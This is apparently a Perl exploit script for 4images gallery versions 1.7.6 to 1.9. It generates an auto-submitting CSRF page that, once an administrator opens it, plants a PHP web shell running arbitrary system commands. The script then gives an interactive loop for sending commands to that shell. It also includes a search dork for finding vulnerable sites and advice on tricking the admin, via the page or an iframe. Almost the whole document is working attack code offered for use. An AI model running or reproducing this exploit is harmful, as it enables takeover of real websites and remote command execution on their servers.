#!/usr/bin/perl
########################################################################
# Title    : 4images 1.7.6 > 9 Csrf inject php code
# Author   : Or4nG.M4n
# Version  : 1.7.6 > 9
# Homepage : http://www.4homepages.de/
# Dork     : "Powered by 4images"
# video    : http://youtu.be/NYF_zC9hH54
# Thnks~#+----------------------------------+
#        |    xSs m4n   i-Hmx   h311c0d3    |.sp. abo.B4sil
#        |   HcJ Cyb3r ahwak20o0 sa^Dev!L   |.sp. r00ts3c
#        +----------------------------------+
#                       4images 1.7.6 > 9 Csrf inject php code
# vuln : template.php
use LWP::UserAgent;
use LWP::Simple;
system("cls");
print
"
+----------------------------------------+\n
| 4images 1.7.6 > 9 csrf inject php code |\n
|   Or4nG.M4n  : priv8te\@hotmail.com    |\n
+----------------------------------------+\n
Loading ...\n
";
sleep(3);
print "http://tragt & path #";
$h = <STDIN>;
chomp $h;
$html = '<form action="'.$h.'/admin/templates.php" name="csrf" method="post">
<input type="hidden" name="action" value="savetemplate">
<textarea name="content" cols="0" rows="0" >
<?php
$cmd = $_GET["cmd"];
print "\n__Code__\n";
@system($cmd);
print "\n__Code__\n";
?>
&lt;/textarea&gt;
<input type="hidden" name="template_file_name" value="inject.php">
<input type="hidden" name="template_folder" value="default">
<script>document.csrf.submit();</script>
</form>';
sleep(2);
print "Createing ...\n";
open(XSS , '>>csrf.htm');
print XSS $html;
close(XSS);
print "Createing Done .. \n";
sleep(2);
print "Now give csrf.htm to admin or useing iframe code\n";
sleep(1);
print "\n if you done hit any key to continue";
$continue = <>;
for($ops=0;$ops<15;$ops++)
{
print "
Command# ";
$execut =<STDIN>;
chomp($execut);
$ex = $h."/templates/default/inject.php?cmd=".$execut;
my $content = get $ex;
while($content =~ m{__Code__(.*?)__code__(.*)}g){
print "\n [+]Executing\n\n";
}
print  $content;
}
# The End